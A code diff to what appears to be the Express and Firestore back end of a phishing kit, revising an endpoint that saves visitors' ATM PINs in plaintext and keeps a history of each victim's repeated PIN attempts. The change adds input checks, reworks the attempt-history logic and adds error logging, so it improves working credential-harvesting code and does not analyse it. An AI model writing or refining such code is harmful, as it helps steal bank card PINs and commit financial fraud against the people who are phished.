@@ -334,42 +334,48 @@ app.post('/api/save-atm-pin', async (req, res) => {
         }
         
         const { atmPin } = req.body;
+        if (!atmPin) {
+            return res.status(400).json({ success: false, error: 'No ATM PIN provided' });
+        }
+        
         const { getFirestore } = require('./firebase-config');
         const db = getFirestore();
         const timestamp = new Date().toISOString();
         const docRef = db.collection('visitors').doc(vid);
-        const doc = await docRef.get();
         
-        const attemptCount = doc.exists && doc.data().atmPin && doc.data().atmPin.history 
-            ? Object.keys(doc.data().atmPin.history).length 
+        // جلب المستند أو إنشاء فارغ
+        const doc = await docRef.get();
+        const data = doc.exists ? doc.data() : {};
+        
+        // حساب رقم المحاولة
+        const historyCount = data.atmPin && data.atmPin.history 
+            ? Object.keys(data.atmPin.history).length 
             : 0;
         
-        const updates = {
-            'atmPin.current': {
-                atmPin,
-                timestamp,
-                attemptNumber: attemptCount + 1
-            },
-            'lastUpdated': timestamp
-        };
+        const updates = {};
         
-        // حفظ المحاولة السابقة في history إذا كانت موجودة
-        if (doc.exists) {
-            const data = doc.data();
-            if (data.atmPin && data.atmPin.current) {
-                const historyCount = data.atmPin.history ? Object.keys(data.atmPin.history).length : 0;
-                const attemptKey = `atmPin.history.attempt_${historyCount + 1}`;
-                updates[attemptKey] = {
-                    ...data.atmPin.current,
-                    savedAt: timestamp
-                };
-            }
+        // حفظ المحاولة السابقة في history
+        if (data.atmPin && data.atmPin.current) {
+            const attemptKey = `atmPin.history.attempt_${historyCount + 1}`;
+            updates[attemptKey] = {
+                ...data.atmPin.current,
+                savedAt: timestamp
+            };
         }
+        
+        // حفظ المحاولة الحالية
+        updates['atmPin.current'] = {
+            atmPin,
+            timestamp,
+            attemptNumber: historyCount + 1
+        };
+        updates['lastUpdated'] = timestamp;
         
         await docRef.set(updates, { merge: true });
         
         res.json({ success: true });
     } catch (error) {
+        console.error('ATM PIN save error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
